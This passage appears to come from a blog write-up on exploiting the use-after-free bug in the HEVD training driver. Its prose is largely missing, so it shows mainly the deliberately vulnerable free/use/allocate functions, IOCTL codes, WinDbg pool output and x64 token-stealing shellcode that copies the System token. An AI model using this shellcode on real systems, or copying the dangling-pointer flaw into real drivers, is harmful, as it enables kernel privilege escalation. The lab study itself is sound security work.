ret</span><br></pre></td></tr></table></figure><p><code>gs:[188h]</code> <code>_KTHREAD</code> 0x220 <code>_KPROCESS</code> <code>0xb8</code>, 0x98<code>_KAPC_STATE</code><code>0x20</code><code>_KPROCESS</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _KTHREAD</span><br><span class="line">   ...</span><br><span class="line">   +0x098 ApcStateFill     : [43] UChar</span><br><span class="line">   +0x0c3 Priority         : Char</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _KAPC_STATE</span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY</span><br><span class="line">   +0x020 Process          : Ptr64 _KPROCESS</span><br><span class="line">   +0x028 InProgressFlags  : UChar</span><br><span class="line">   +0x028 KernelApcInProgress : Pos 0, 1 Bit</span><br><span class="line">   +0x028 SpecialApcInProgress : Pos 1, 1 Bit</span><br><span class="line">   +0x029 KernelApcPending : UChar</span><br><span class="line">   +0x02a UserApcPendingAll : UChar</span><br><span class="line">   +0x02a SpecialUserApcPending : Pos 0, 1 Bit</span><br><span class="line">   +0x02a UserApcPending   : Pos 1, 1 Bit</span><br></pre></td></tr></table></figure><p>r3 <code>_KPROCESS </code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x0B8</span>]</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x220</span>]</span><br></pre></td></tr></table></figure><p><code>_EPROCESS</code><code>_KPROCESS</code>dt</p><ul><li>KPROCESS EPROCESS KPROCESSEPROCESSEPROCESScoreelKPROCESSProcess Object</li><li><a href="https://stackoverflow.com/questions/5790587/what-is-the-difference-between-eprocess-object-and-kprocess-object">Stack Overflow</a></li></ul><p> <code>_KPROCESS</code>, <code>UniqueProcessId</code>pid<code>InheritedFromUniqueProcessId</code>pid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   ...</span><br><span class="line">   +0x540 InheritedFromUniqueProcessId : Ptr64 Void</span><br><span class="line">   +0x548 OwnerProcessId   : Uint8B</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>cmd.exe cmd  <code>_KPROCESS</code>systemtoken</p><p> <code>ActiveProcessLinks</code>system(pid&#x3D;4)<code>_KPROCESS</code><a href="https://bbs.kanxue.com/thread-224058-1.htm"></a></p><ul><li>EPROCESS  KTHREAD + 0xb8</li><li>ActiveProcessLinks  EPROCESS + 0x448</li><li>ActiveProcessLinks  Token </li><li>token  EPROCESS + 0x4b8 </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    mov rdx, [gs:<span class="number">188</span>h]       ;get _ETHREAD pointer from KPCR</span><br><span class="line">    mov r8, [rdx+<span class="number">0xb8</span>]       ;_EPROCESS (see PsGetCurrentProcess function)</span><br><span class="line">    mov r9, [r8+<span class="number">0x448</span>]       ;ActiveProcessLinks list head</span><br><span class="line">    mov rcx, [r9]            ;follow link to first process in list</span><br><span class="line">find_system_proc:</span><br><span class="line">    mov rdx, [rcx<span class="number">-8</span>]         ;offset from ActiveProcessLinks to UniqueProcessId</span><br><span class="line">    cmp rdx, <span class="number">4</span>               ;process with ID <span class="number">4</span> is System process</span><br><span class="line">    jz found_it</span><br><span class="line">    mov rcx, [rcx]           ;follow _LIST_ENTRY Flink pointer</span><br><span class="line">    cmp rcx, r9              ;see <span class="keyword">if</span> back at list head</span><br><span class="line">    jnz find_system_proc</span><br><span class="line">found_it:</span><br><span class="line">    mov rax, [rcx+<span class="number">0x80</span>]      ;offset from ActiveProcessLinks to Token</span><br><span class="line">    <span class="keyword">and</span> al, <span class="number">0xf0</span>             ;clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">    mov [r8+<span class="number">0x4b8</span>], rax      ;replace current process token with system token</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>windbg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!object \ObjectTypes</span><br><span class="line"></span><br><span class="line">dt nt!_OBJECT_TYPE &lt;addr&gt;</span><br><span class="line">dt nt!_OBJECT_TYPE_INITIALIZER &lt;addr&gt;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>freeNULL</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">FreeUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Freeing UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Secure Note: This is secure because the developer is setting</span></span><br><span class="line">            <span class="comment">// &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL once the Pool chunk is being freed</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Set to NULL to avoid dangling pointer</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            g_UseAfterFreeObjectNonPagedPool = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Vulnerability Note: This is a vanilla Use After Free vulnerability</span></span><br><span class="line">            <span class="comment">// because the developer is not setting &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL.</span></span><br><span class="line">            <span class="comment">// Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer</span></span><br><span class="line">            <span class="comment">// (dangling pointer)</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UAFcallback</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">UseUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Using UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool-&gt;Callback);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Calling Callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool-&gt;Callback)</span><br><span class="line">            &#123;</span><br><span class="line">                g_UseAfterFreeObjectNonPagedPool-&gt;<span class="built_in">Callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><ul><li>NonPagedPool </li><li> <code>Nx</code> </li></ul><p>g_UseAfterFreeObjectNonPagedPool </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">AllocateUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Allocating UaF Object\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Allocate Pool chunk</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)<span class="built_in">ExAllocatePoolWithTag</span>(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UseAfterFree)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Unable to allocate Pool chunk</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Status = STATUS_NO_MEMORY;</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(NonPagedPool));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fill the buffer with ASCII &#x27;A&#x27;</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlFillMemory</span>((PVOID)UseAfterFree-&gt;Buffer, <span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer), <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Null terminate the char buffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Buffer[<span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Set the object Callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Callback = &amp;UaFObjectCallbackNonPagedPool;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Assign the address of UseAfterFree to a global variable</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        g_UseAfterFreeObjectNonPagedPool = UseAfterFree;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree Object: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree-&gt;Callback: 0x%p\n&quot;</span>, UseAfterFree-&gt;Callback);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UAF</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_USE_AFTER_FREE_NON_PAGED_POOL</span></span><br><span class="line">&#123;</span><br><span class="line">    FunctionPointer Callback;</span><br><span class="line">    CHAR Buffer[<span class="number">0x54</span>];</span><br><span class="line">&#125; USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;</span><br></pre></td></tr></table></figure><p>IoctlCode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222013</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x222017</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">UseUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x22201B</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">FreeUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>NonPagedPoolalloc0x60</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PoolWithTag = (<span class="type">const</span> <span class="type">void</span> **)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x60</span>ui64, <span class="number">0x6B636148</span>u);</span><br></pre></td></tr></table></figure><p>UAFcallback</p><h3 id="Exploit-NonPagedPool"><a href="#Exploit-NonPagedPool" class="headerlink" title="Exploit NonPagedPool"></a>Exploit NonPagedPool</h3><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; lm m H*</span><br></pre></td></tr></table></figure><p>DbgPrint</p><ul><li><code>DebugBreak()</code>kenel debug</li></ul><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br></pre></td></tr></table></figure><p> <code>Tag</code> poolDebugView.<code>!poolfind</code> <code>!pool</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 Hack</span><br><span class="line">0: kd&gt; !poolfind Hack -nonpaged</span><br><span class="line">3: kd&gt; g</span><br><span class="line">***** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">[+] Allocating UaF Object</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x60</span><br><span class="line">[+] Pool Chunk: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree Object: 0xFFFFA78BEF702B50</span><br><span class="line">[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree-&gt;Callback: 0xFFFFF8012D287CD0</span><br><span class="line">****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">0033:00007ff9`b21bb6d2 cc              int     3</span><br><span class="line">1: kd&gt; !pool 0xFFFFA78BEF702B50</span><br><span class="line">Pool page ffffa78bef702b50 region is Nonpaged pool</span><br><span class="line"> ffffa78bef702000 size:   30 previous size:    0  (Free)       ....</span><br><span class="line"> # ...</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dq 0xFFFFA78BEF702B50</span><br><span class="line">ffffa78b`ef702b50  fffff801`2d287cd0 41414141`41414141</span><br><span class="line">ffffa78b`ef702b60  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b70  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b80  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b90  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702ba0  41414141`41414141 00000000`00414141</span><br><span class="line">ffffa78b`ef702bb0  fe8fc5c0`d7167489 00000000`00000000</span><br><span class="line">ffffa78b`ef702bc0  00000000`00000000 ffffa78b`ef714039</span><br></pre></td></tr></table></figure><p>pool pool header</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"></span><br><span class="line">1: kd&gt; !poolused 2 Hack</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">....</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"> Hack         1          112          0            0UNKNOWN pooltag &#x27;Hack&#x27;, please update pooltag.txt</span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure><p>0x70</p><p></p><ul><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/sysinfo/kernel-objects"> - Win32 apps</a></li></ul><p>UAF heap fengshui</p><ul><li> <a href="https://blog.csdn.net/qq_36918532/article/details/123417458">(3)</a></li><li><code>NtAllocateReserveObject</code> x64</li><li>x64<code>CreatePipe</code><code>WriteFile</code>NonPagedPoolPoolSize-HeaderSize(0x48)NpFr tag<a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">(4)</a>[(5)](<a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">Windows Kernel Exploitation  HEVD x64 Use-After-Free  Vulndev</a>)</li></ul><p>freehole</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 